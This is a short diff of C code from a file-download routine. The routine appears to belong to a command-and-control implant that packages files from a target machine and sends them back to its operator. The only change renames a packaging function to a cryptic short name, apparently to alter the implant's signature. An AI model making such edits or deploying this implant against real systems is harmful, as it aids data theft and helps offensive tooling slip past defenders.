@@ -153,9 +153,9 @@ VOID DownloadPush()
                 Package = PackageCreateWithRequestID( DEMON_COMMAND_FS, Download->RequestID );
 
                 /* Add Download header. */
-                PackageAddInt32( Package, 2 ); /* Download sub command */
-                PackageAddInt32( Package, DOWNLOAD_MODE_WRITE );
-                PackageAddInt32( Package, Download->FileID    );
+                PkgAdIn32( Package, 2 ); /* Download sub command */
+                PkgAdIn32( Package, DOWNLOAD_MODE_WRITE );
+                PkgAdIn32( Package, Download->FileID    );
 
                 /* Download Write data (and only send what we read.) */
                 PackageAddBytes( Package, Instance->DownloadChunk.Buffer, Read );
@@ -171,12 +171,12 @@ VOID DownloadPush()
                 Package = PackageCreateWithRequestID( DEMON_COMMAND_FS, Download->RequestID );
 
                 /* Add Download header. */
-                PackageAddInt32( Package, 2 ); /* Download sub command */
-                PackageAddInt32( Package, DOWNLOAD_MODE_CLOSE );
-                PackageAddInt32( Package, Download->FileID    );
+                PkgAdIn32( Package, 2 ); /* Download sub command */
+                PkgAdIn32( Package, DOWNLOAD_MODE_CLOSE );
+                PkgAdIn32( Package, Download->FileID    );
 
                 /* Download Close data */
-                PackageAddInt32( Package, DOWNLOAD_REASON_FINISHED );
+                PkgAdIn32( Package, DOWNLOAD_REASON_FINISHED );
 
                 /* Send that chunk */
                 PackageTransmit( Package );
